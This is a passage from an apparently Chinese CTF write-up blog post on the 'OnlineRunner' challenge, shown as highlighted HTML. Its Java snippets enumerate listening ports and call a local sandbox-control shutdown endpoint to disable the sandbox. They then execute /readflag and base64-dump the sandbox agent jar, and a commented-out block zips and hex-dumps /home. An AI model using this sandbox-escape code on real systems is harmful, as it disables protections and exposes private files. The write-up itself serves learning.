class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line">String[] files = &#123;<span class="string">&quot;/proc/net/tcp&quot;</span>, <span class="string">&quot;/proc/net/tcp6&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">f</span> <span class="operator">=</span> <span class="number">0</span>; f &lt; files.length; f++) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                java.io.<span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(<span class="keyword">new</span> <span class="title class_">java</span>.io.FileReader(files[f]));</span><br><span class="line">                String line;</span><br><span class="line">                reader.readLine(); <span class="comment">// Skip header line</span></span><br><span class="line">                <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    line = line.trim();</span><br><span class="line">                    String[] parts = line.split(<span class="string">&quot;\\s+&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (parts.length &gt; <span class="number">3</span>) &#123;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">local_address</span> <span class="operator">=</span> parts[<span class="number">1</span>];</span><br><span class="line">                        <span class="type">String</span> <span class="variable">state</span> <span class="operator">=</span> parts[<span class="number">3</span>];</span><br><span class="line">                        <span class="comment">// State 0A means LISTEN</span></span><br><span class="line">                        <span class="keyword">if</span> (state.equals(<span class="string">&quot;0A&quot;</span>)) &#123;</span><br><span class="line">                            String[] addrPort = local_address.split(<span class="string">&quot;:&quot;</span>);</span><br><span class="line">                            <span class="type">String</span> <span class="variable">ipHex</span> <span class="operator">=</span> addrPort[<span class="number">0</span>];</span><br><span class="line">                            <span class="type">String</span> <span class="variable">portHex</span> <span class="operator">=</span> addrPort[<span class="number">1</span>];</span><br><span class="line">                            <span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                            <span class="keyword">if</span> (files[f].endsWith(<span class="string">&quot;tcp6&quot;</span>)) &#123;</span><br><span class="line">                                <span class="comment">// IPv6 address parsing</span></span><br><span class="line">                                <span class="type">StringBuilder</span> <span class="variable">ipBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> ipHex.length(); i &gt; <span class="number">0</span>; i -= <span class="number">8</span>) &#123;</span><br><span class="line">                                    <span class="type">String</span> <span class="variable">segment</span> <span class="operator">=</span> ipHex.substring(Math.max(i - <span class="number">8</span>, <span class="number">0</span>), i);</span><br><span class="line">                                    <span class="type">StringBuilder</span> <span class="variable">segBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> segment.length(); j &gt; <span class="number">0</span>; j -= <span class="number">2</span>) &#123;</span><br><span class="line">                                        segBuilder.append(segment.substring(j - <span class="number">2</span>, j));</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    ipBuilder.insert(<span class="number">0</span>, segBuilder.toString());</span><br><span class="line">                                    <span class="keyword">if</span> (i &gt; <span class="number">8</span>) &#123;</span><br><span class="line">                                        ipBuilder.insert(<span class="number">0</span>, <span class="string">&quot;:&quot;</span>);</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                                ip = ipBuilder.toString();</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="comment">// IPv4 address parsing</span></span><br><span class="line">                                <span class="type">StringBuilder</span> <span class="variable">ipBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> ipHex.length(); i &gt; <span class="number">0</span>; i -= <span class="number">2</span>) &#123;</span><br><span class="line">                                    <span class="type">String</span> <span class="variable">part</span> <span class="operator">=</span> ipHex.substring(i - <span class="number">2</span>, i);</span><br><span class="line">                                    <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> Integer.parseInt(part, <span class="number">16</span>);</span><br><span class="line">                                    ipBuilder.insert(<span class="number">0</span>, num);</span><br><span class="line">                                    <span class="keyword">if</span> (i &gt; <span class="number">2</span>) &#123;</span><br><span class="line">                                        ipBuilder.insert(<span class="number">0</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                                ip = ipBuilder.toString();</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> Integer.parseInt(portHex, <span class="number">16</span>);</span><br><span class="line">                            System.out.println(<span class="string">&quot;Listening on &quot;</span> + ip + <span class="string">&quot;:&quot;</span> + port);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                reader.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">                System.out.println(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">            java.net.<span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.net.URL(<span class="string">&quot;http://127.0.0.1:46461/sandbox/default/module/http/sandbox-control/shutdown&quot;</span>);</span><br><span class="line">            java.net.<span class="type">HttpURLConnection</span> <span class="variable">connection</span> <span class="operator">=</span> (java.net.HttpURLConnection) url.openConnection();</span><br><span class="line">            connection.setRequestMethod(<span class="string">&quot;GET&quot;</span>);</span><br><span class="line">            java.io.<span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(connection.getInputStream())</span><br><span class="line">            );</span><br><span class="line">            String line;</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">response</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                response.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            reader.close();</span><br><span class="line">            connection.disconnect();</span><br><span class="line">            System.out.println(response.toString()); System.out.println(connection.getResponseCode());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">            System.out.println(e);</span><br><span class="line">        &#125;</span><br><span class="line"> <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;/readflag&quot;</span>; <span class="comment">// Use &quot;dir&quot; on Windows</span></span><br><span class="line">            java.lang.<span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> java.lang.Runtime.getRuntime().exec(command);</span><br><span class="line">            java.io.<span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(process.getInputStream())</span><br><span class="line">            );</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line">            reader.close();</span><br><span class="line">            process.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*try&#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">java.io.File folder = new java.io.File(&quot;/home&quot;);</span></span><br><span class="line"><span class="comment">        if (!folder.isDirectory()) &#123;</span></span><br><span class="line"><span class="comment">            System.out.println(&quot;Provided path is not a folder&quot;);</span></span><br><span class="line"><span class="comment">            return;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();</span></span><br><span class="line"><span class="comment">        java.util.zip.ZipOutputStream zos = new java.util.zip.ZipOutputStream(baos);</span></span><br><span class="line"><span class="comment">        java.util.Stack&lt;java.io.File&gt; stack = new java.util.Stack&lt;java.io.File&gt;();</span></span><br><span class="line"><span class="comment">        stack.push(folder);</span></span><br><span class="line"><span class="comment">        while (!stack.isEmpty()) &#123;</span></span><br><span class="line"><span class="comment">            java.io.File currentFile = stack.pop();</span></span><br><span class="line"><span class="comment">            if (currentFile.isDirectory()) &#123;</span></span><br><span class="line"><span class="comment">                java.io.File[] fileList = currentFile.listFiles();</span></span><br><span class="line"><span class="comment">                if (fileList != null) &#123;</span></span><br><span class="line"><span class="comment">                    for (int i = 0; i &lt; fileList.length; i++) &#123;</span></span><br><span class="line"><span class="comment">                        stack.push(fileList[i]);</span></span><br><span class="line"><span class="comment">                    &#125;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment">            &#125; else &#123;</span></span><br><span class="line"><span class="comment">                java.io.FileInputStream fis = new java.io.FileInputStream(currentFile);</span></span><br><span class="line"><span class="comment">                String zipEntryName = currentFile.getAbsolutePath().substring(folder.getAbsolutePath().length() + 1);</span></span><br><span class="line"><span class="comment">                zos.putNextEntry(new java.util.zip.ZipEntry(zipEntryName));</span></span><br><span class="line"><span class="comment">                byte[] buffer = new byte[1024];</span></span><br><span class="line"><span class="comment">                int length;</span></span><br><span class="line"><span class="comment">                while ((length = fis.read(buffer)) &gt; 0) &#123;</span></span><br><span class="line"><span class="comment">                    zos.write(buffer, 0, length);</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment">                fis.close();</span></span><br><span class="line"><span class="comment">                zos.closeEntry();</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        zos.close();</span></span><br><span class="line"><span class="comment">        byte[] zipBytes = baos.toByteArray();</span></span><br><span class="line"><span class="comment">        StringBuilder hexString = new StringBuilder();</span></span><br><span class="line"><span class="comment">        for (int i = 0; i &lt; zipBytes.length; i++) &#123;</span></span><br><span class="line"><span class="comment">            String hex = Integer.toHexString(0xff &amp; zipBytes[i]);</span></span><br><span class="line"><span class="comment">            if (hex.length() == 1) hexString.append(&#x27;0&#x27;);</span></span><br><span class="line"><span class="comment">            hexString.append(hex);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        System.out.println(hexString.toString());</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#125;catch(Exception e)&#123;System.out.println(e);&#125;*/</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#读取文件</span><br><span class="line"></span><br><span class="line">try &#123;                  </span><br><span class="line">    java.io.File file = new java.io.File(&quot;/home/ctf/sandbox/lib/sandbox-agent.jar&quot;); // 需要读取的二进制文件     </span><br><span class="line">    java.io.BufferedInputStream bis = new java.io.BufferedInputStream(new java.io.FileInputStream(file));                  </span><br><span class="line">            byte[] buffer = new byte[1024]; // 创建一个字节数组作为缓冲区                  </span><br><span class="line">            int bytesRead;                       </span><br><span class="line">            while ((bytesRead = bis.read(buffer)) != -1) &#123; // 循环读取                  </span><br><span class="line">                // 处理读取的数据（这里可以进行打印、处理等）                  </span><br><span class="line">                //System.out.write(buffer, 0, bytesRead);                  </span><br><span class="line">System.out.print(&#x27;&quot;&#x27;);                  </span><br><span class="line">                System.out.print(java.util.Base64.getEncoder().encodeToString(buffer));                  </span><br><span class="line">System.out.println(&quot;\&quot;,&quot;);                  </span><br><span class="line">	      &#125;                                   </span><br><span class="line">        &#125; catch (                  </span><br><span class="line">java.io.IOException e) &#123;                  </span><br><span class="line">            e.printStackTrace();                  </span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>其实比赛的时候想过用base64将文件编码读取，但是因为数据过大导致网页卡死了就没有继续想过了</p>
+<hr>
+<p>唉，还得继续学，太菜了</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/10/15/KKcms%E4%BB%A3%E5%AE%A1/" rel="prev" title="KKcms代审">
+      <i class="fa fa-chevron-left"></i> KKcms代审
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#capoo"><span class="nav-number">1.</span> <span class="nav-text">capoo</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ez-picker"><span class="nav-number">2.</span> <span class="nav-text">ez_picker</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Spreader"><span class="nav-number">3.</span> <span class="nav-text">Spreader</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#OnlineRunner"><span class="nav-number">4.</span> <span class="nav-text">OnlineRunner</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">吕宙航</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">39</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">吕宙航</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">129k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">1:57</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/xxx/anime.min.js"></script>
+  <script src="/xxx/velocity/velocity.min.js"></script>
+  <script src="/xxx/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
